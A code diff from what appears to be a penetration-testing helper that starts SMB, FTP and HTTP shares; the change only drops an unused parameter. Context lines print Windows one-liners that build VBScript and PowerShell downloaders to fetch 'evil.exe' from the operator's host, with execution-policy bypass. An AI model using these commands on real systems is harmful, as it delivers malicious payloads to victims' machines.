@@ -9,7 +9,7 @@ from src.shares.httpserver import httpServer
 from src.shares.ftpserver import ftpServer
 from src.shares.smbserver import smbServer
 
-def share_smb(cmd=None,state=None):
+def share_smb(cmd=None):
     if len(cmd) == 2:
         if cmd[1] == "start":
             pid = os.fork()
@@ -49,7 +49,7 @@ def share_smb(cmd=None,state=None):
         return
     return
 
-def share_ftp(cmd=None,state=None):
+def share_ftp(cmd=None):
     if len(cmd) == 2:
         if cmd[1] == "start":
             pid = os.fork()
@@ -95,7 +95,7 @@ def share_ftp(cmd=None,state=None):
         return
     return
 
-def share_http(cmd=None,state=None):
+def share_http(cmd=None):
     if len(cmd) == 2:
         if cmd[1] == "start":
             pid = os.fork()
@@ -136,7 +136,7 @@ def share_http(cmd=None,state=None):
         print("{}Usage: http <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
         return
 
-def share_vbscript(cmd=None,state=None):
+def share_vbscript(cmd=None):
     print ("""
 {}echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -167,7 +167,7 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs http://{}/evil.exe evil.exe{}
     """.format(bcolors.OKBLUE,Config.HOSTIP,bcolors.ENDC))
     return
-def share_powershell(cmd=None,state=None):
+def share_powershell(cmd=None):
     print("""
 {}echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
@@ -182,6 +182,6 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 switcher_share = {"smb":share_smb,"ftp":share_ftp,"http":share_http,"powershell":share_powershell,"vbscript":share_vbscript}
 
 
-def internal_share(cmd=None,state=None):
+def internal_share(cmd=None):
 
-    switcher_share.get(cmd[0],"Invalid!")(cmd,state)
+    switcher_share.get(cmd[0],"Invalid!")(cmd)
